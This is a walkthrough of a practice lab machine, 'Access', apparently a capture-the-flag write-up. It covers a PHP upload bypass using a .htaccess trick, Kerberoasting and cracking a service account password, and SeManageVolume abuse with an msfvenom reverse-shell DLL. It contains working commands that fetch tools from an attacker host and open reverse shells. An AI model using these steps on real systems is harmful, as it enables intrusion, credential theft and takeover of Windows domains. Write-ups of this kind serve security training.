---
icon: windows
---

# Access - Intermediate

## Gaining Access

Nmap scan:

```
#Nmap TCP
nmap -A -T4 -p- -Pn 192.168.198.187 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-18 11:30 EDT
Nmap scan report for 192.168.198.187
Host is up (0.029s latency).
Not shown: 65508 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
|_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Access The Event
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-09-18 15:38:33Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: access.offsec0., Site: Default-First-Site-Name)
443/tcp   open  ssl/http      Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
|_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
| http-methods: 
|_  Potentially risky methods: TRACE
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_http-title: Access The Event
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: access.offsec0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  msrpc         Microsoft Windows RPC
49691/tcp open  msrpc         Microsoft Windows RPC
49701/tcp open  msrpc         Microsoft Windows RPC
49719/tcp open  msrpc         Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=9/18%OT=53%CT=1%CU=31079%PV=Y%DS=4%DC=T%G=Y%TM=68CC27C
OS:1%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=106%TI=I%CI=I%TS=U)SEQ(SP=1
OS:02%GCD=3%ISR=10B%TI=I%CI=I%TS=U)SEQ(SP=104%GCD=1%ISR=109%TI=I%CI=I%TS=U)
OS:SEQ(SP=104%GCD=1%ISR=10D%TI=I%CI=I%TS=U)SEQ(SP=FD%GCD=1%ISR=108%TI=I%CI=
OS:I%TS=U)OPS(O1=M578NW8NNS%O2=M578NW8NNS%O3=M578NW8%O4=M578NW8NNS%O5=M578N
OS:W8NNS%O6=M578NNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN
OS:(R=Y%DF=Y%T=80%W=FFFF%O=M578NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F
OS:=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%
OS:RUCK=G%RUD=G)IE(R=N)

Network Distance: 4 hops
Service Info: Host: SERVER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-09-18T15:39:39
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   31.97 ms 192.168.45.1
2   32.00 ms 192.168.45.254
3   32.05 ms 192.168.251.1
4   32.25 ms 192.168.198.187
```

The ldap scan shows the Domain name of access.offsec. I'll add it to my /etc/hosts/ file

```
192.168.154.187	access.offsec
```

### HTTP 80 - TCP

<figure><img src="../../.gitbook/assets/image (1915).png" alt=""><figcaption></figcaption></figure>

At first glance this looks like a static website.

### Dirsearch

```
dirsearch -u http://access.offsec/
```

<figure><img src="../../.gitbook/assets/image (1916).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1917).png" alt=""><figcaption></figcaption></figure>

Dirsearch reveals an accessible uploads directory. This lead me into looking for an upload functionality, and I found it in the buying tickets option.

### PHP File Upload Vulnerability

<figure><img src="../../.gitbook/assets/image (1918).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1919).png" alt=""><figcaption></figcaption></figure>

<pre><code><strong>$ curl -I http://access.offsec/
</strong>HTTP/1.1 200 OK
Date: Thu, 18 Sep 2025 18:30:24 GMT
Server: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
Last-Modified: Mon, 11 Oct 2021 13:26:28 GMT
ETag: "c210-5ce13ad22e900"
Accept-Ranges: bytes
Content-Length: 49680
Content-Type: text/html
</code></pre>

We know it's an Apache website, but uploading a regular php shell will not work here.

<figure><img src="../../.gitbook/assets/image (1921).png" alt=""><figcaption></figcaption></figure>

I managed into tricking it by appending the .png extension to the file&#x20;

<figure><img src="../../.gitbook/assets/image (1922).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1923).png" alt=""><figcaption></figcaption></figure>

I've tried a couple of php reverse shells but with no success, they are not being rendered

It turned out the server didn't render the shell at all due to the unknown extension, it printed out the source code.

Since the server running on the machine is apache. So we could potentially upload a ".htaccess" file to the directory to let the server render a random extension as PHP scripts

I made a ".htaccess" file and sent it to the server.

```
echo "AddType application/x-httpd-php .deimos" > .htaccess
```

<figure><img src="../../.gitbook/assets/image (1924).png" alt=""><figcaption></figcaption></figure>

The .htaccess file is a hidden file it will not show in the uploads folder

<figure><img src="../../.gitbook/assets/image (1925).png" alt=""><figcaption></figcaption></figure>

I used [**revshells**](https://www.revshells.com/) to create a php reverse shell. Save php ivan sincek as shell.deimos and upload it, then we will access it from the uploads folder and get a reverse shell.

<figure><img src="../../.gitbook/assets/image (1926).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1927).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1928).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1929).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

<figure><img src="../../.gitbook/assets/image (1935).png" alt=""><figcaption></figcaption></figure>

svc\_apache does not have any interesting privileges, nor is he in any interesting groups. First thing I like doing on AD is collect data and Enumerate it using Bloodhound.

### Bloodhound

I am going to use SharpHound.exe to perform data collection for Bloodhound.

`iwr -uri http://192.168.45.158/SharpHound.exe -outfile SharpHound.exe`

`.\SharpHound.exe --CollectionMethods All --ZipFileName output.zip`

<figure><img src="../../.gitbook/assets/image (1930).png" alt=""><figcaption></figcaption></figure>

For Transfering the File I simply placed it in the uploads directory of the xampp application

`cp 20250918120537_output.zip C:\xampp\htdocs\uploads`

<figure><img src="../../.gitbook/assets/image (1931).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1932).png" alt=""><figcaption></figcaption></figure>

It uploaded it twice, I downloaded it from there started bloodhound and uploaded the data into Bloodhound.

```
sudo neo4j start
bloodhound
```

### List all Kerberoastable Accounts

<figure><img src="../../.gitbook/assets/image (1933).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1934).png" alt=""><figcaption></figcaption></figure>

I know svc\_mssql user is kerberoastable thanks to bloodhound. I cannot get his spn using impacket, I'll have to do it locally. I'll use [**Get-SPN.ps1**](https://github.com/compwiz32/PowerShell/blob/master/Get-SPN.ps1)

### **Manual Kerberoasting**

```
iwr -uri http://192.168.45.158/Get-SPN.ps1 -outfile Get-SPN.ps1
```

```
. .\Get-SPN.ps1
```

<figure><img src="../../.gitbook/assets/image (1936).png" alt=""><figcaption></figcaption></figure>

The MSSQL service account will likely have better privileges. Now that we have the SPN, we are able to request a ticket and store it in memory with the end goal of getting it's hash.

To request the ticket, two commands can be executed to request and store the ticket in the memory.

```
Add-Type -AssemblyName System.IdentityModel
```

```
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'MSSQLSvc/DC.access.offsec'
```

<figure><img src="../../.gitbook/assets/image (1937).png" alt=""><figcaption></figcaption></figure>

Extracting the hash can also be done with a handy Powershell Empire [**script** ](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1)that engages Kerberos.

```
iwr -uri http://192.168.45.158/Invoke-Kerberoast.ps1 -outfile Invoke-Kerberoast.ps1
```

```
. .\Invoke-Kerberoast.ps1
```

```
Invoke-Kerberoast -OutputFormat Hashcat
```

<figure><img src="../../.gitbook/assets/image (1938).png" alt=""><figcaption></figcaption></figure>

Now let's crack the krb5tgs hash

```
hashcat -m 13100 -a 0 svc_mssql.krb5tgs.hash /usr/share/wordlists/rockyou.txt 
```

<figure><img src="../../.gitbook/assets/image (1700).png" alt=""><figcaption></figcaption></figure>

Creds work

<figure><img src="../../.gitbook/assets/image (1701).png" alt=""><figcaption></figcaption></figure>

Unfortunately winrm and impacket-psexec do not work in our scenario so we will make use of [**RunasCs.exe**](https://github.com/antonioCoco/RunasCs)

### **Shell as user svc\_mssql**

```
iwr -uri http://192.168.45.158/RunasCs.exe -outfile RunasCs.exe
```

Make sure you have a listener ready on port 443 before running the below command

```
./RunasCs.exe svc_mssql trustno1 -r 192.168.45.158:443 cmd
```

<figure><img src="../../.gitbook/assets/image (1702).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1703).png" alt=""><figcaption></figcaption></figure>

### SeManageVolumePrivilege

<figure><img src="../../.gitbook/assets/image (1704).png" alt=""><figcaption></figcaption></figure>

The SeManageVolumePrivilege privilege was set to enabled on the svc\_mssql user, which was interesting

After some research, I found a [**SeManageVolumeAbuse**](https://github.com/xct/SeManageVolumeAbuse) GitHub repo that can be used in this circumstance.

The general idea is that the attacker can leverage this particular privilege with the exploitation to get full control over "C:\\", and then it can craft a ".dll" file and place it in somewhere "C:\Windows\System32\\" to trigger the payload as root.

I then downloaded the binary executable from [**here**](https://github.com/CsEnox/SeManageVolumeExploit/releases/tag/public) and transferred it to the machine.

```
iwr -uri http://192.168.45.158/SeManageVolumeExploit.exe -outfile SeManageVolumeExploit.exe
```

```
.\SeManageVolumeExploit.exe
```

<figure><img src="../../.gitbook/assets/image (1705).png" alt=""><figcaption></figcaption></figure>

In summary, we can leverage our newfound super powers to hijack a DLL used by anything. We will use systeminfo's tzres.dll but you should be able to use any .dll if you are willing to do the research.

I made a reverse shell payload through "msfvenom".

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.158 LPORT=135 -f dll -o tzres.dll
```

<figure><img src="../../.gitbook/assets/image (1706).png" alt=""><figcaption></figcaption></figure>

```
cd c:\windows\system32\wbem
```

```
iwr -uri http://192.168.45.158/tzres.dll -outfile tzres.dll
```

<figure><img src="../../.gitbook/assets/image (1707).png" alt=""><figcaption></figcaption></figure>

Make sure you have a listener ready on port 135, than run **`systeminfo`** to get a reverse shell

<figure><img src="../../.gitbook/assets/image (1708).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1709).png" alt=""><figcaption></figcaption></figure>

And Now we have a shell as Admin!
